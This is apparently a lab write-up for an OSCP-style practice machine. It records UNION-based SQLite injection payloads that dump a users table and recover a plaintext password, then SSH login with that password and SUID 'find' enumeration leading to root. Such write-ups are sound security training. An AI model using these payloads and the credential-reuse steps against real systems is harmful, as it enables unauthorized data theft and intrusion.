---
type: machine-overview
project: OSCP-Exam-PoC
machine: EA-01
difficulty: Easy
status: completed
initial_user: robert
initial_access: SQLite SQL Injection
privilege_escalation: SUID find
target: x.x.x.x
http_port: PORT_N
ssh_port: PORT_H
user_access: confirmed
root_access: confirmed
user_flag_submitted: true
root_flag_submitted: true
tags:
  - oscp
  - ea-01
  - easy
  - sql-injection
  - sqlite
  - ssh
  - suid
  - find
---

# EA-01 — Machine Overview

> **Flag completion:** User and root flags obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Machine Information

|Property|Value|
|---|---|
|Machine ID|EA-01|
|Difficulty|Easy|
|Target IP|`x.x.x.x`|
|HTTP Port|`PORT_N`|
|SSH Port|`PORT_H`|
|Web Application|Search application|
|Database|SQLite|
|Initial Access|UNION-based SQL injection|
|Initial Linux Account|`robert`|
|Privilege Escalation|SUID binary exploitation|
|Vulnerable Binary|`/usr/bin/find`|
|Operating System|Debian GNU/Linux 13 (Trixie)|
|Kernel|`6.8.0-147-generic`|
|Machine Hostname|`easy`|
|Final Privilege|`root`|
|Machine Status|Completed|

## 2. Examination Objectives

### User-Level Objective

The first challenge required obtaining user-level access and submitting:

```
user.txt
```

The objective was completed through SSH access using credentials recovered from the web application's SQLite database.

### Root-Level Objective

The second challenge required escalating privileges and submitting:

```
/root/root.txt
```

The objective was completed through SUID-based privilege escalation using GNU `find`.

## 3. Attack Chain

```
HTTP Search Application
          |
          v
SQL Injection
          |
          v
UNION-Based SQL Injection
          |
          v
Identify SQLite Backend
          |
          v
Enumerate sqlite_master
          |
          v
Discover users Table
          |
          v
Extract Credentials
          |
          v
SSH Authentication
          |
          v
Access as robert
          |
          v
Read user.txt
          |
          v
Submit User Flag
          |
          v
Enumerate SUID Binaries
          |
          v
Discover SUID /usr/bin/find
          |
          v
GNU find -exec Privilege Escalation
          |
          v
Effective UID = 0
          |
          v
Read /root/root.txt
          |
          v
Submit Root Flag
```

## 4. Reconnaissance Summary

### 4.1 Exposed Services

The examination provided two access points:

|Service|Endpoint|Purpose|
|---|---|---|
|HTTP|`http://x.x.x.x:PORT_N`|Web application reconnaissance|
|SSH|`x.x.x.x:PORT_H`|Linux authentication|

The provided SSH command was:

```
ssh user@x.x.x.x -p PORT_H
```

The recommended approach was to investigate the HTTP application first while preserving SSH as a possible entry point.

### 4.2 Web Application

The search application accepted a query parameter:

```
q
```

The initial SQL injection observation was:

```
http://x.x.x.x:PORT_N/?q=%27--+
```

I observed that the search results could be displayed without entering a normal search term.

This suggested that the search parameter was influencing the application's SQL query.

The application displayed two columns:

|Column|Displayed Field|
|---|---|
|1|Name|
|2|Bio|

This established the two-column requirement for the UNION-based injection.

## 5. Initial Access Summary

### 5.1 Identify the Database Engine

The first attempts used MySQL/MariaDB's `information_schema.tables`:

```
' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema = DATABASE()-- -
```

And:

```
' UNION SELECT table_name, table_schema FROM information_schema.tables-- -
```

Both attempts failed.

The next attempt used SQLite's system catalog:

```
' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- -
```

This succeeded.

The returned rows included:

|Name|Bio|
|---|---|
|Alice Morgan|Front-end engineer, loves CSS.|
|Bader Khalil|Network team, CCNA.|
|Chen Wei|QA automation.|
|Dalia Nasser|Product designer.|
|members|`CREATE TABLE members (...)`|
|users|`CREATE TABLE users (...)`|

The application was therefore confirmed to use SQLite.

Two tables were identified:

```
members
users
```

The `users` table was particularly interesting because its schema exposed:

```
id
username
password
```

### 5.2 Extract Database Credentials

The next UNION query retrieved the credential records:

```
' UNION SELECT username, password FROM users-- -
```

Captured results:

|Username|Password|
|---|---|
|`admin`|`b7e1...rotated...do-not-use`|
|`robert`|`Falcon#Quarry7`|

The `admin` credential was explicitly marked as rotated and not to be used.

The `robert` record contained a candidate usable credential.

This was the credential selected for SSH authentication.

### 5.3 SSH Authentication

From Kali Linux:

```
ssh robert@x.x.x.x -p PORT_H
```

Password:

```
Falcon#Quarry7
```

The SSH connection succeeded.

The initial Linux account was:

```
robert
```

### 5.4 Retrieve the User Flag

From the SSH session:

```
cat user.txt
```

Captured output:

```
IT{FLAG-SECRET}
```

<badge color="success">User flag submitted</badge>

The user-level objective was completed successfully.

See [[Difficulty Levels/Easy/EA-01/user]].

## 6. Privilege Escalation Summary

### 6.1 Initial Privilege Enumeration

The first sudo check was:

```
sudo -l
```

Response:

```
-bash: sudo: command not found
```

Sudo was not installed, so the investigation moved to alternative privilege-escalation mechanisms.

### 6.2 Current Identity and Groups

Captured output:

```
robert@easy:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert)

robert@easy:~$ groups
robert
```

The account had no additional supplementary groups.

Attempting to access the root home directory directly failed:

```
-bash: cd: /root/: Permission denied
```

### 6.3 Operating System and Kernel

Captured output:

```
Linux easy 6.8.0-147-generic #147-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 24 11:33:16 UTC 2026 x86_64 GNU/Linux
```

Operating-system information:

```
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.7
ID=debian
```

The environment reported Debian 13 while running an Ubuntu generic kernel.

This discrepancy was recorded as an environmental observation, not proof of a containerization weakness.

### 6.4 Available Tools

The following paths were returned:

```
/usr/bin/find
/usr/bin/python3
/usr/bin/perl
/usr/bin/gcc
/usr/bin/curl
```

The absence of `getcap`, Netcat, and other queried utilities was not established as a privilege-escalation limitation.

## 7. SUID Enumeration

### 7.1 Find SUID Binaries

The following enumeration command was executed:

```
find / -type f -perm -4000 -ls 2>/dev/null
```

Captured output:

```
2913545    488 -rwsr-xr-x   1 root root 498240 May  6  2026 /usr/lib/openssh/ssh-keysign
2622215     72 -rwsr-xr-x   1 root root  72072 Jul 31 15:34 /usr/bin/mount
2622220     20 -rwsr-xr-x   1 root root  18816 Jul 31 15:34 /usr/bin/newgrp
2622108     52 -rwsr-xr-x   1 root root  52936 Apr 19  2025 /usr/bin/chsh
2622307     56 -rwsr-xr-x   1 root root  55688 Jul 31 15:34 /usr/bin/umount
2622158    228 -rwsr-xr-x   1 root root 233040 Aug 10  2024 /usr/bin/find
2622283     84 -rwsr-xr-x   1 root root  84360 Jul 31 15:34 /usr/bin/su
2622102     72 -rwsr-xr-x   1 root root  70888 Apr 19  2025 /usr/bin/chfn
2622231    116 -rwsr-xr-x   1 root root 118168 Apr 19  2025 /usr/bin/passwd
2622166     88 -rwsr-xr-x   1 root root  88568 Aug 10  2024 /usr/bin/gpasswd
```

### 7.2 Identify the Vulnerable Binary

The important entry was:

```
-rwsr-xr-x 1 root root 233040 Aug 10 2024 /usr/bin/find
```

The `s` in the owner's execute position indicates the SUID bit.

The binary was owned by root:

```
Owner: root
Group: root
```

Consequently, executing this SUID binary caused it to run with the file owner's effective privileges.

GNU `find` also supports the `-exec` action, which can execute external programs.

The combination provided the privilege-escalation path.

See [[Difficulty Levels/Easy/EA-01/root]].

## 8. Difficulties Encountered

|Difficulty|Observation|Resolution|
|---|---|---|
|Database engine initially unknown|MySQL/MariaDB enumeration failed|Switched to SQLite catalog enumeration|
|Two-column output constraint|Application displayed Name and Bio|Used two-column UNION queries|
|Admin credential unavailable|Credential marked rotated / do not use|Selected the usable `robert` record|
|Sudo unavailable|`sudo: command not found`|Shifted to SUID enumeration|
|No obvious privileged groups|`robert` belonged only to its own group|Continued filesystem and binary enumeration|
|Root directory inaccessible|Permission denied|Continued privilege enumeration instead of guessing credentials|

## 9. Technical Findings

|Finding ID|Finding|Evidence|Result|
|---|---|---|---|
|EA-01-F01|SQL injection in search parameter|`q` parameter accepted SQL syntax|Database query manipulation|
|EA-01-F02|SQLite backend|`sqlite_master` returned table definitions|Database engine identified|
|EA-01-F03|Credential disclosure|UNION query against `users`|Retrieved SSH credential|
|EA-01-F04|SSH credential reuse|SSH as `robert` succeeded|Initial access|
|EA-01-F05|Sudo unavailable|`sudo: command not found`|Alternative enumeration required|
|EA-01-F06|SUID `find`|Root-owned SUID binary|Privilege escalation|
|EA-01-F07|Root access|I reported completion before proceeding to ME-01|Root objective completed|

## 10. Reusable Techniques

### SQLite SQL Injection

Relevant techniques:

- Determine the number of columns in the original query.
    
- Identify the database engine.
    
- Enumerate tables through `sqlite_master`.
    
- Inspect database schema definitions.
    
- Extract relevant application records through UNION queries.
    

### Credential-Based SSH Access

Relevant techniques:

- Identify exposed SSH services.
    
- Extract credentials from application databases.
    
- Test credential reuse against explicitly exposed authentication surfaces.
    
- Verify the resulting Linux execution identity.
    

### SUID Privilege Escalation

Relevant techniques:

- Enumerate SUID binaries.
    
- Inspect file ownership and permissions.
    
- Identify dangerous functionality in privileged executables.
    
- Consult GTFOBins for known exploitation techniques.
    

Reference:

[GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)

## 11. Evidence Index

|Evidence|Description|Status|
|---|---|---|
|HTTP application|Port `PORT_N`|Recorded|
|SSH service|Port `PORT_H`|Recorded|
|Search parameter|`q`|Recorded|
|Database identification|SQLite|Confirmed|
|Database tables|`members`, `users`|Confirmed|
|Extracted credentials|`robert` and `admin` records|Recorded|
|SSH authentication|Successful as `robert`|Confirmed|
|User flag|`IT{FLAG-SECRET}`|Recorded|
|OS information|Debian 13|Recorded|
|Kernel information|Ubuntu generic 6.8.0-147|Recorded|
|SUID enumeration|Complete output preserved|Recorded|
|Vulnerable binary|`/usr/bin/find`|Confirmed|
|Root exploitation command|SUID find with `-exec`|Recorded in [[Difficulty Levels/Easy/EA-01/root]]|
|Root flag|`/root/root.txt`| Obtained and submitted (participant-confirmed) |

## 12. Lessons Learned

1. **Identify the database engine before choosing enumeration syntax.** The failed MySQL queries were useful because they prompted the switch to SQLite-specific enumeration.
    
2. **Use the application's output constraints.** The two-column UNION requirement was established from the visible `Name` and `Bio` fields.
    
3. **Inspect the complete credential record before attempting authentication.** The `admin` record was marked as rotated, while `robert` provided the usable credential.
    
4. **Database credentials can expose operating-system access.** Credential reuse allowed the transition from a web application vulnerability to SSH access.
    
5. **Do not stop at missing sudo.** The absence of sudo does not eliminate privilege-escalation opportunities.
    
6. **SUID enumeration is a high-value Linux privilege-escalation check.** The root-owned SUID `find` binary provided a direct path to elevated execution.
    
7. **Different machines can expose the same binary through different misconfigurations.** VE-01 abused `find` through sudo; EA-01 abused it through SUID. The binary was the same, but the privilege mechanism was different.
    

## 13. Related Documentation

- [[EA-01 Overview]]
    
- [[Difficulty Levels/Easy/EA-01/user]]
    
- [[Difficulty Levels/Easy/EA-01/root]]
    
- [[Methodology/Web Enumeration]]
    
- [[Methodology/Linux Privilege Escalation]]
    
- [[Methodology/Evidence Collection]]
    

## Documentation Completion Checklist

- Target services recorded
    
- SQL injection documented
    
- SQLite backend identified
    
- Database tables enumerated
    
- Credentials recovered
    
- SSH initial access documented
    
- User flag preserved
    
- Linux enumeration documented
    
- SUID binary identified
    
- Root objective completion recorded
    
- Raw root exploitation output attached
    
- Root flag value recovered from original evidence